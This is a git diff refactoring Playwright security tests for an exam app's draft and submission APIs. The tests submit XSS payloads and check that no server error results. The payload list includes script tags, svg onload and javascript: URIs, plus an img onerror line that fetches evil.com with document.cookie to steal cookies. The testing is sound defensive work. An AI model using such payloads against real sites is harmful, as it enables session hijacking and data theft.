@@ -340,125 +340,56 @@ test.describe("Security Tests — SQL Injection", () => {
 // 5. XSS in Exam Submission Data
 // ============================================================
 
-test.describe("Security Tests — XSS in Submissions", () => {
-  test.afterEach(async () => {
-    await cleanupTestData();
-  });
-
-  test("XSS script tag in draft answer is stored safely (not executed)", async ({
-    studentRequest,
-  }) => {
-    const exam = await seedExam({ status: "running" });
-    const session = await seedSession(exam.id, "test-student-id", {
-      status: "in_progress",
-    });
-
-    const xssPayload = "<script>alert('xss')</script>";
-
-    const res = await studentRequest.post("/api/supa", {
-      data: {
-        action: "save_draft",
-        data: {
-          sessionId: session.id,
-          questionId: "0",
-          answer: xssPayload,
-        },
-      },
-    });
-
-    // API should accept and store it (sanitization happens at render time)
-    // or strip the tags — either way, no 500
-    expect(res.status()).toBeLessThan(500);
-
-    // Verify the stored value — either sanitized or stored as-is for output encoding
-    const { data: submissions } = await supabase
-      .from("submissions")
-      .select("answer")
-      .eq("session_id", session.id)
-      .eq("q_idx", 0);
-
-    expect(submissions).toBeTruthy();
-    expect(submissions!.length).toBe(1);
-    // The answer should be stored (React auto-escapes on render) or sanitized
-    // Either way, the API did not crash
-    expect(submissions![0].answer).toBeDefined();
-  });
-
-  test("XSS img onerror in draft answer is stored safely", async ({
-    studentRequest,
-  }) => {
-    const exam = await seedExam({ status: "running" });
-    const session = await seedSession(exam.id, "test-student-id", {
-      status: "in_progress",
-    });
-
-    const xssPayload = '<img onerror=alert(1) src=x>';
-
-    const res = await studentRequest.post("/api/supa", {
-      data: {
-        action: "save_draft",
-        data: {
-          sessionId: session.id,
-          questionId: "0",
-          answer: xssPayload,
-        },
-      },
-    });
-
-    expect(res.status()).toBeLessThan(500);
-
-    const { data: submissions } = await supabase
-      .from("submissions")
-      .select("answer")
-      .eq("session_id", session.id)
-      .eq("q_idx", 0);
-
-    expect(submissions).toBeTruthy();
-    expect(submissions!.length).toBe(1);
-    expect(submissions![0].answer).toBeDefined();
-  });
-
-  test("multiple XSS vectors in a single answer are handled safely", async ({
-    studentRequest,
-  }) => {
-    const exam = await seedExam({ status: "running" });
-    const session = await seedSession(exam.id, "test-student-id", {
-      status: "in_progress",
-    });
-
-    const xssPayload = [
+const XSS_VECTORS = [
+  ["script tag", "<script>alert('xss')</script>"],
+  ["img onerror", '<img onerror=alert(1) src=x>'],
+  [
+    "multiple vectors",
+    [
       "<script>document.cookie</script>",
       '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
       "<svg onload=alert(1)>",
       "javascript:alert('xss')",
       '<div onmouseover="alert(1)">hover me</div>',
-    ].join("\n");
+    ].join("\n"),
+  ],
+] as const;
 
-    const res = await studentRequest.post("/api/supa", {
-      data: {
-        action: "save_draft",
-        data: {
-          sessionId: session.id,
-          questionId: "0",
-          answer: xssPayload,
-        },
-      },
-    });
-
-    expect(res.status()).toBeLessThan(500);
-
-    const { data: submissions } = await supabase
-      .from("submissions")
-      .select("answer")
-      .eq("session_id", session.id)
-      .eq("q_idx", 0);
-
-    expect(submissions).toBeTruthy();
-    expect(submissions!.length).toBe(1);
-    // Stored safely — the answer exists and the API did not crash
-    expect(submissions![0].answer).toBeDefined();
-    expect(typeof submissions![0].answer).toBe("string");
+test.describe("Security Tests — XSS in Submissions", () => {
+  test.afterEach(async () => {
+    await cleanupTestData();
   });
+
+  for (const [label, xssPayload] of XSS_VECTORS) {
+    test(`save_draft with XSS (${label}) is stored safely — no 500`, async ({
+      studentRequest,
+    }) => {
+      const exam = await seedExam({ status: "running" });
+      const session = await seedSession(exam.id, "test-student-id", {
+        status: "in_progress",
+      });
+
+      const res = await studentRequest.post("/api/supa", {
+        data: {
+          action: "save_draft",
+          data: { sessionId: session.id, questionId: "0", answer: xssPayload },
+        },
+      });
+
+      // API must not 500 — sanitization/escaping happens at render time
+      expect(res.status()).toBeLessThan(500);
+
+      const { data: submissions } = await supabase
+        .from("submissions")
+        .select("answer")
+        .eq("session_id", session.id)
+        .eq("q_idx", 0);
+
+      expect(submissions).toBeTruthy();
+      expect(submissions!.length).toBe(1);
+      expect(typeof submissions![0].answer).toBe("string");
+    });
+  }
 
   test("XSS in submit_exam answers is handled safely", async ({
     studentRequest,
@@ -470,7 +401,6 @@ test.describe("Security Tests — XSS in Submissions", () => {
       attempt_timer_started_at: new Date().toISOString(),
     });
 
-    // Seed drafts first (submit_exam expects existing submissions)
     await seedSubmission(session.id, 0, { answer: "draft 0" });
     await seedSubmission(session.id, 1, { answer: "draft 1" });
 
@@ -482,20 +412,13 @@ test.describe("Security Tests — XSS in Submissions", () => {
           studentId: "test-student-id",
           sessionId: session.id,
           answers: [
-            {
-              questionIdx: 0,
-              text: "<script>alert('xss')</script>",
-            },
-            {
-              questionIdx: 1,
-              text: '<img onerror=alert(1) src=x>',
-            },
+            { questionIdx: 0, text: "<script>alert('xss')</script>" },
+            { questionIdx: 1, text: '<img onerror=alert(1) src=x>' },
           ],
         },
       },
     });
 
-    // Should succeed or return a clean error — never 500
     expect(res.status()).toBeLessThan(500);
   });
 });
